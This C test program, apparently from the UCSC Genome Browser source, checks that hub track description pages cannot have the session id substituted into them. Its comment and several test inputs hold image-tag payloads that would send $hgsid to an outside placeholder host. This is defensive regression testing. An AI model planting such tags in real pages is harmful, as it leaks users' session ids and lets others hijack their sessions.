/* hVarSubstHtmlTester - check which variables a track description page may use.
 *
 * hVarSubstTrackDbHtml() runs over a hub track's description page at render time.  A hub's
 * page comes straight off somebody else's web server and has never been substituted, so a
 * short explicit list of variables is resolved here.  A native page went through hgTrackDb
 * when trackDb was loaded, so it is left alone.
 *
 * No session id is on that list, and none is available anywhere in hVarSubst.  A description
 * page is only lightly sanitized -- an <img> with an http src survives it -- so a page
 * containing <img src="https://example.com/px?s=..."> would hand the reader's session id to
 * the page's author, and a session id alone is enough to read and write that cart.  The links
 * in a description page get their session id in the browser instead, from addHgsidToLinks()
 * in utils.js, which only touches links that stay on this server.
 *
 * That is the case this test exists for, and it is invisible twice over: the page renders
 * identically either way, and the leak is a request to somebody else's host.
 *
 * refs #38380 */

/* Copyright (C) 2026 The Regents of the University of California
 * See kent/LICENSE or http://genome.ucsc.edu/license/ for licensing information. */

#include "common.h"
#include "hash.h"
#include "trackDb.h"
#include "hVarSubst.h"

/* An assembly that is certainly present, for the variables that ask hdb about one. */
#define DB "hg38"

static void show(char *what, char *trackName, char *html)
/* Run one description page through the substitution and print what came out. */
{
struct trackDb *tdb;
AllocVar(tdb);
tdb->track = cloneString(trackName);
tdb->table = cloneString(trackName);
tdb->type = cloneString("bed 3 .");
tdb->settings = cloneString("");
tdb->settingsHash = trackDbSettingsFromString(tdb, tdb->settings);
tdb->html = cloneString(html);

hVarSubstTrackDbHtml(tdb, DB);
printf("  %-30s %-34s -> %s\n", what, html, tdb->html);
}

static void hubPage()
/* track names beginning hub_ take the hub list. */
{
char *track = "hub_1_myTrack";
printf("a hub's description page\n");
show("$db resolves", track, "<p>assembly $db</p>");
show("${db} in braces too", track, "<p>assembly ${db}</p>");
show("$$db stays a dollar", track, "<p>$$db</p>");
show("$hgsid is NOT a variable", track, "<img src=\"http://x/p?s=$hgsid\">");
show("${hgsid} is NOT a variable", track, "<img src=\"http://x/p?s=${hgsid}\">");
show("a price is not a variable", track, "<p>costs $5 million</p>");
}

static void nativePage()
/* Any other track name is a native page, already substituted by hgTrackDb, so this pass
 * leaves every one of them alone. */
{
char *track = "knownGene";
printf("\na native description page\n");
show("${hgsid} is not a variable", track, "<a href=\"x?hgsid=${hgsid}\">go</a>");
show("$hgsid is not a variable", track, "<a href=\"x?hgsid=$hgsid\">go</a>");
show("$db was done by hgTrackDb", track, "<p>assembly $db</p>");
show("a price is not a variable", track, "<p>costs $5 million</p>");
}

static void nothingToDo()
/* The cases that must not crash or invent a page. */
{
printf("\nnothing to substitute\n");
show("no dollar at all", "hub_1_myTrack", "<p>plain</p>");
show("empty page", "hub_1_myTrack", "");

struct trackDb *tdb = NULL;
hVarSubstTrackDbHtml(tdb, DB);
printf("  %-30s %s\n", "a NULL track", "returned, no crash");
}

int main(int argc, char *argv[])
{
hubPage();
nativePage();
nothingToDo();
printf("\n");
return 0;
}
